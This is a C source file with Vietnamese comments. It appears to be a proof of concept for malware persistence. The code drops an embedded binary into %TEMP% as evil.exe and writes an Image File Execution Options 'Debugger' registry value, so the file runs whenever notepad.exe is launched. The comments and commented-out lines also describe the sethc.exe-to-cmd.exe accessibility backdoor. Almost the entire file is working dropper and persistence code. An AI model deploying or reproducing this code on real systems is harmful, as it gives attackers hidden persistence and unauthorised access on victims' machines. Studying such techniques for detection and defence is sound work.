#include "MyRegistry.h"
#include "resource.h"
#include <tchar.h>
#include <Windows.h>

/*
** Mô tả:
** - Kỹ thuật này cho phép chạy một tệp độc hại khi chạy một chương trình trình khác
** - Khóa HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
		chứa danh sách các tiến trình.
** => Mã độc có thể chọn một tiến trình nào đó và thêm một biến kiểu string: "Debugger"="Path\to\evil.exe"
** - Kỹ thuật này còn được gọi là Image Hijacking
** - Kỹ thuật này cũng đc dùng để lợi dụng các chương trình trợ năng (Accessibility Programs)
	=> Set "Debugger" cho "sethc.exe" thành: "C:\Windows\System32\cmd.exe" hoặc "C:\Windows\System32\Taskmgr.exe"
	Do các phiên bản Windows mới kiểm tra chặt với sethc.exe, thay vào đó ta lợi dụng cmd.exe/Taskmgr.exe
** PoC:
** - Dopped tệp độc hại ra %TEMP%
** - Set Debugger cho chương trình notepad.exe chứa đường dẫn đến tệp độc hại trong %TEMP%
** - Mỗi khi mở notepad.exe thì tệp độc hại cũng sẽ được chạy.
** Ref:
** 1. Reading And Writing Windows Registry Using WinAPI
**	https://aticleworld.com/reading-and-writing-windows-registry/
*/


int main()
{
	// *** Stage 1: Find and load resource ***
	HRSRC	hRes;			 // handle/ptr resource
	HGLOBAL	hResLoad;		 // handle to loaded resource
	LPVOID	lpResLock;		 // pointer to resource data

	// Locate the resource in file.
	printf(" [+] Finding resource.\n");
	Sleep(500);

	hRes = FindResourceA(
		NULL,		// locate resource current process
		101,		// name of resource (resource ID)
		"BIN");		// type of resource
	if (hRes == NULL) {
		printf(" [-] Could not locate resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Load the resource into global memory.
	hResLoad = LoadResource(
		NULL,	// current process
		hRes);	// handle to the resource
	if (hResLoad == NULL) {
		printf(" [-] Could not load resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Lock the resource into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		printf(" [-] Could not lock resource. Error Code = %d\n", GetLastError());
		return;
	}


	// *** Stage 2: Dropped/Extract/Write resource binary to file ***
	DWORD	dwSizeOfRes = 0;			// size (bytes) of the specified resource
	TCHAR	filePath[MAX_PATH];			// full path of file dropped
	TCHAR	lpTempPathBuffer[MAX_PATH];	// path of temp directory
	DWORD	dwRetVal = 0;				// temp variable

	printf(" [+] Dropping evil file.\n");
	Sleep(500);

	// Calculating size of resource
	dwSizeOfRes = SizeofResource(
		NULL,	// current process
		hRes);	// handle/ptr resource

	// Get the temp path env
	dwRetVal = GetTempPath(
		MAX_PATH,          // length of the buffer
		lpTempPathBuffer); // buffer for path 
	if (dwRetVal > MAX_PATH || (dwRetVal == 0)) {
		printf(" [-] Could not get temp path. Error Code = %d\n", GetLastError());
		return;
	}

	// Generates a temporary file name.
	wsprintfA(filePath, TEXT("%sevil.exe"), lpTempPathBuffer);

	HANDLE	hFileWriter;
	DWORD	dwBytesWritten = 0;
	BOOL	bErrorFlag = FALSE;

	// Create dropped file
	hFileWriter = CreateFile(
		filePath,				// name of the write
		GENERIC_WRITE,			// open for writing
		NULL,					// do not share
		NULL,					// default security
		CREATE_NEW,				// create new file only
		FILE_ATTRIBUTE_NORMAL,	// normal file
		NULL);					// no attr. template
	if (hFileWriter == INVALID_HANDLE_VALUE) {
		printf(" [-] Terminal failure: Unable to open file \"%s\" for write. Error Code = %d\n", filePath, GetLastError());
		return;
	}

	printf(" [+] Writing %d bytes to \"%s\".\n", dwSizeOfRes, filePath);
	Sleep(500);

	bErrorFlag = WriteFile(
		hFileWriter,		// open file handle
		lpResLock,			// start of data to write
		dwSizeOfRes,		// number of bytes to write
		&dwBytesWritten,	// number of bytes that were written
		NULL);				// no overlapped structure
	if (FALSE == bErrorFlag) {
		printf(" [-] Terminal failure: Unable to write to \"%s\". Error Code = %d\n", filePath, GetLastError());
	}
	else {
		if (dwBytesWritten != dwSizeOfRes) {
			printf(" [-] Error: dwBytesWritten != dwSizeOfRes. Error Code = %d\n", GetLastError());
		}
		else {
			printf(" [+] Wrote %d bytes to \"%s\" successfully.\n", dwBytesWritten, filePath);
		}
	}
	CloseHandle(hFileWriter);

	// *** Stage 3: Persistence via Image File Execution Options Registry***
	// Write to: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options

	BOOL	status = FALSE;
	
	Sleep(500);
	printf(" [+] Setting up Persistence via IFEO Registry.\n");
	// Create registry key if not exist
	status = CreateRegistryKey(
		HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe"); // sethc.exe
	if (status != TRUE) {
		printf(" [-] Error Opening or Creating new key. Code = %d\n", GetLastError());
		return;
	}

	// Write to Registry.
	status = FALSE;
	//TCHAR	cmdPath[MAX_PATH] = "C:\\Windows\\System32\\cmd.exe"; // C:\\Windows\\System32\\Taskmgr.exe
	status = WriteStringToRegistry(
		HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe", // sethc.exe
		"Debugger",
		(PWCHAR)filePath); //cmdPath
	if (status != TRUE) {
		printf(" [-] Error write string to Registry. Code = %d\n", GetLastError());
		return;
	}
	Sleep(500);
	printf(" [+] Successfully. Goodbye!\n");

	return 0;
}